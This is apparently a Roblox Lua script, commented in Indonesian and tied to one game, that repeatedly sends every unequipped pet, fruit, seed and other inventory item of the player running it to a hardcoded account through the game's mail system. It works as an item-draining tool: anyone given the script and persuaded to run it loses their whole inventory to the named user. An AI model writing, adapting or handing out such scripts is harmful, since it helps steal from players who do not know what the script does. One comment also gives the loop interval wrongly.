-- Konfigurasi Ketat (Ubah hanya di sini sebelum dijalankan)
local TARGET_USERNAME = "mozenian" -- Ganti dengan username target pengiriman

--------------------------------------------------------------------------------
-- KEAMANAN & INISIALISASI
--------------------------------------------------------------------------------
if game.PlaceId ~= 97598239454123 then
    warn("[Auto-Mail] Salah game. Script dihentikan.")
    return
end

local Players = game:GetService("Players")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local LocalPlayer = Players.LocalPlayer

local Networking = require(ReplicatedStorage.SharedModules.Networking)
local PlayerStateClient = require(ReplicatedStorage.ClientModules.PlayerStateClient)
local MailboxItemCatalog = require(LocalPlayer.PlayerScripts.Controllers.MailboxController.MailboxItemCatalog)

print("[Auto-Mail] Menginisialisasi sistem pengiriman OTOMATIS ALL INVENTORY...")

-- Mencari UserId dari target username
local targetUserId = nil
local success, id, displayName = pcall(function()
    return Networking.Mailbox.LookupPlayer:Fire(TARGET_USERNAME)
end)

if success and id and id > 0 then
    targetUserId = id
    print(string.format("[Auto-Mail] Target terkunci: %s (ID: %d)", displayName, targetUserId))
else
    warn("[Auto-Mail] Tidak dapat menemukan pengguna target. Silakan periksa kembali username-nya.")
    return
end

--------------------------------------------------------------------------------
-- LOGIKA PEMERIKSAAN DAN PENGIRIMAN (ALL INVENTORY)
--------------------------------------------------------------------------------
local MAX_ITEM_PER_SLOT = 99999 -- Ubah angka ini sesuai batas maksimal 1 slot di game (misal 99, 999, atau 9999)

local function checkAndSendInventory()
    local replica = PlayerStateClient:GetLocalReplica()
    if not replica or not replica.Data or not replica.Data.Inventory then return end
    
    local inventory = replica.Data.Inventory
    local apiBatch = {}
    
    for _, cat in ipairs(MailboxItemCatalog.Categories) do
        local catData = inventory[cat]
        if typeof(catData) == "table" then
            
            -- Logika untuk kategori Pet atau Buah Hasil Panen (Item UUID unik non-stackable)
            if cat == "Pets" or cat == "HarvestedFruits" then
                for itemKey, itemVal in pairs(catData) do
                    if typeof(itemVal) == "table" and itemVal.Id ~= nil then
                        if cat == "Pets" and itemVal.Equipped == true then
                            continue
                        end
                        
                        table.insert(apiBatch, {
                            Category = cat,
                            ItemKey = itemKey,
                            Count = 1
                        })
                    end
                end
            else
                -- Logika yang DIPERBAIKI untuk item biasa/stackable (Seeds, Tools, dll.)
                for itemKey, itemData in pairs(catData) do
                    local amount = 0
                    local actualItemKey = itemKey

                    -- Deteksi apakah data berupa angka langsung atau di dalam tabel
                    if typeof(itemData) == "number" then
                        amount = itemData
                    elseif typeof(itemData) == "table" then
                        -- Cari letak jumlah item disimpan (.Amount, .Count, atau default 1)
                        amount = itemData.Amount or itemData.Count or itemData.Value or 1
                        actualItemKey = itemData.Id or itemKey 
                    end

                    -- Sistem pemecah tumpukan (Kirim semuanya tapi dibagi per batas slot)
                    if amount > 0 then
                        while amount > 0 do
                            local sendAmount = math.min(amount, MAX_ITEM_PER_SLOT)
                            table.insert(apiBatch, {
                                Category = cat,
                                ItemKey = actualItemKey,
                                Count = sendAmount
                            })
                            amount = amount - sendAmount
                        end
                    end
                end
            end
            
        end
    end
    
    if #apiBatch > 0 then
        print(string.format("[Auto-Mail] Terdeteksi %d slot item yang siap dikirim. Memproses...", #apiBatch))
        
        local currentBatch = {}
        for i, item in ipairs(apiBatch) do
            table.insert(currentBatch, item)
            
            if #currentBatch == 20 or i == #apiBatch then
                local sendSuccess, result = pcall(function()
                    return Networking.Mailbox.SendBatch:Fire(targetUserId, currentBatch, "Automated Bulk Delivery")
                end)
                
                if sendSuccess then
                    print("[Auto-Mail] Batch berhasil diproses!")
                else
                    warn("[Auto-Mail] Pengiriman gagal:", tostring(result))
                end
                
                currentBatch = {}
                task.wait(6) 
            end
        end
    end
end

--------------------------------------------------------------------------------
-- LOOP PEMANTAUAN BACKGROUND
--------------------------------------------------------------------------------
-- Memeriksa dan menguras inventaris secara otomatis setiap 15 detik
task.spawn(function()
    while true do
        pcall(checkAndSendInventory)
        task.wait(3000)
    end
end)
